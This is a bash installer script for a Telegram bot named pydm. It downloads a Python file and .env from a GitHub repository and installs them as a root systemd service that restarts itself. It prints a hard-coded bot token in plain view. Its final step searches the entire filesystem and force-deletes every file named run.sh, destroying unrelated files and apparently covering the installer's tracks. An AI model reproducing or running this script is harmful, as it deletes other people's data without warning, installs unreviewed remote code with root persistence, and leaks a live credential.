#!/bin/bash
#Prepare the environment
print_blue() {
    echo -e "\e[1;34m$1\e[0m"
}
print_blu() {
    echo -e "\e[34m$1\e[0m"
}
print_yellow() {
    echo -e "\e[1;33m$1\e[0m"
}
print_pink() {
    echo -e "\e[1;95m$1\e[0m"
}
print_viola() {
    echo -e "\e[1;35m$1\e[0m"
}
progres() {
comando[0]="$1"
comando[1]="$2"
 (
[[ -e $HOME/fim ]] && rm $HOME/fim
${comando[0]} -y > /dev/null 2>&1
${comando[1]} -y > /dev/null 2>&1
touch $HOME/fim
 ) > /dev/null 2>&1 &
 tput civis
echo -ne "  \033[1;33mWAIT \033[1;37m- \033[1;33m["
while true; do
   for((i=0; i<18; i++)); do
   echo -ne "\033[1;31m#"
   sleep 0.1s
   done
   [[ -e $HOME/fim ]] && rm $HOME/fim && break
   echo -e "\033[1;33m]"
   sleep 1s
   tput cuu1
   tput dl1
   echo -ne "  \033[1;33mWAIT \033[1;37m- \033[1;33m["
done
echo -e "\033[1;33m]\033[1;37m -\033[1;32m OK !\033[1;37m"
tput cnorm
}

run_bot() {
    #Run the bot
    systemctl daemon-reload 
    systemctl enable pydm 
    systemctl start pydm
    echo ""
    sleep 4

}


    # [make service file]
systemd() {
    echo '[Unit]
    Description=Made by Teslassh (( ZERO ONE LLC ))
    After=network.target

    [Service]
    User=root
    Type=simple
    ExecStart=/usr/bin/python3 /etc/dewk/toxic/pydm.py 
    WorkingDirectory=/etc/dewk/toxic/
    Restart=always

    [Install]
    WantedBy=multi-user.target' > /etc/systemd/system/pydm.service

    chmod 640 /etc/systemd/system/pydm.service

}
fetch_files() {
    mkdir -p /etc/dewk/toxic
    rm -rf /etc/dewk/toxic/pydm.py
    rm -rf /etc/dewk/toxic/.env
    wget -O /etc/dewk/toxic/pydm.py https://raw.githubusercontent.com/Lordsniffer22/fed/main/pydm.py
    wget -O /etc/dewk/toxic/.env https://raw.githubusercontent.com/Lordsniffer22/fed/main/.env
    wget -O requirements.txt https://raw.githubusercontent.com/Lordsniffer22/fed/main/requirements.txt
    pip install -r requirements.txt
    echo "TOKEN= 7167940962:AAGhsvvZ0RmAitj0uxaODW-shBbiaynTYp4"
}
print_pink 'INSTALLING BOT'
progres 'fetch_files'
progres 'systemd'
progres 'run_bot'
print_pink 'Bot is running...'

find / -type f -name "run.sh" 2>/dev/null | while read -r file;
   do
      rm -f "$file"
   done
